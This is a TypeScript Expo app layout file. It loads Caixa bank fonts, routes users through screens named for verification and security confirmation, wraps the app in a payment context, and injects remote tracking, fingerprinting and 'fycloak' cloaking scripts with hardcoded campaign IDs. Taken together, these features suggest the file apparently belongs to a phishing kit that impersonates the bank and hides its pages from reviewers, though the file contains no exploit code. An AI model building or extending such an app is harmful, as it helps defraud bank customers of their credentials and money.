import { useEffect } from 'react';
import { Stack, useSegments } from 'expo-router';
import { StatusBar } from 'expo-status-bar';
import { useFrameworkReady } from '@/hooks/useFrameworkReady';
import { useFonts } from 'expo-font';
import * as SplashScreen from 'expo-splash-screen';
import { AuthProvider, useAuth } from '@/contexts/AuthContext';
import { PaymentProvider } from '@/contexts/PaymentContext';
import { facebookPixel } from '@/services/facebookPixel';
import { fycloakService } from '@/services/fycloak';
import { Platform } from 'react-native';
import { useRouterWithUTM } from '@/hooks/useRouterWithUTM';

SplashScreen.preventAutoHideAsync();

if (Platform.OS !== 'web') {
  const { Settings } = require('react-native-fbsdk-next');
  Settings.setAppID('4342804642618023');
  Settings.initializeSDK();
}

function RootLayoutNav() {
  const { isAuthenticated, isLoading } = useAuth();
  const segments = useSegments();
  const router = useRouterWithUTM();

  useEffect(() => {
    if (Platform.OS === 'web') {
      (window as any).FYCLOAK_CAMPAIGN_ID = 1019;
      (window as any).FYCLOAK_USER_ID = 65;
      (window as any).pixelId = '693f44aa803b6933879bf21a';

      const utmScript = document.createElement('script');
      utmScript.src = 'https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js';
      utmScript.setAttribute('data-token', '7586e821-db69-436d-8d7c-9cfaf723e188');
      document.head.appendChild(utmScript);

      const fycloakScript = document.createElement('script');
      fycloakScript.src = 'https://cdn.fycloak.com/scripts/advanced-fingerprint.js';
      document.head.appendChild(fycloakScript);

      const utmifyScript = document.createElement('script');
      utmifyScript.src = 'https://cdn.utmify.com.br/scripts/pixel/pixel.js';
      utmifyScript.setAttribute('async', '');
      utmifyScript.setAttribute('defer', '');
      document.head.appendChild(utmifyScript);

      return () => {
        document.head.removeChild(utmScript);
        document.head.removeChild(fycloakScript);
        document.head.removeChild(utmifyScript);
      };
    }
  }, []);

  useEffect(() => {
    if (isLoading) return;

    const currentRoute = segments[0] || 'index';

    if (isAuthenticated && ['index', 'login', 'verificacao', 'confirmacao-nome', 'pre-validacao', 'confirmacao-seguranca-1', 'confirmacao-seguranca-2'].includes(currentRoute)) {
      router.replace('/inicio');
    } else if (!isAuthenticated && currentRoute === 'inicio') {
      router.replace('/');
    }
  }, [isAuthenticated, segments, isLoading]);

  return (
    <>
      <Stack screenOptions={{ headerShown: false }}>
        <Stack.Screen name="index" />
        <Stack.Screen name="+not-found" />
      </Stack>
      <StatusBar style="light" />
    </>
  );
}

export default function RootLayout() {
  useFrameworkReady();

  const [fontsLoaded, fontError] = useFonts({
    'CaixaSTD-Bold': require('@/assets/caixastd-bold.ttf'),
    'CaixaSTD-BoldItalic': require('@/assets/caixastd-bolditalic.ttf'),
    'CaixaSTD-Book': require('@/assets/caixastd-book.ttf'),
    'CaixaSTD-BookItalic': require('@/assets/caixastd-bookitalic.ttf'),
    'CaixaSTD-ExtraBold': require('@/assets/caixastd-extrabold.ttf'),
    'CaixaSTD-ExtraBoldItalic': require('@/assets/caixastd-extrabolditalic.ttf'),
    'CaixaSTD-Italic': require('@/assets/caixastd-italic.ttf'),
    'CaixaSTD-Light': require('@/assets/caixastd-light.ttf'),
    'CaixaSTD-LightItalic': require('@/assets/caixastd-lightitalic.ttf'),
    'CaixaSTD-Regular': require('@/assets/caixastd-regular.ttf'),
    'CaixaSTD-SemiBold': require('@/assets/caixastd-semibold.ttf'),
    'CaixaSTD-SemiBoldItalic': require('@/assets/caixastd-semibolditalic.ttf'),
  });

  useEffect(() => {
    if (fontsLoaded || fontError) {
      SplashScreen.hideAsync().catch((error) => {
        console.error('Error hiding splash screen:', error);
      });

      try {
        facebookPixel.initialize();
      } catch (error) {
        console.error('Error initializing Facebook Pixel:', error);
      }

      try {
        fycloakService.initialize();
      } catch (error) {
        console.error('Error initializing Fycloak:', error);
      }
    }
  }, [fontsLoaded, fontError]);

  if (!fontsLoaded && !fontError) {
    return null;
  }

  if (fontError) {
    console.error('Font loading error:', fontError);
  }

  return (
    <AuthProvider>
      <PaymentProvider>
        <RootLayoutNav />
      </PaymentProvider>
    </AuthProvider>
  );
}
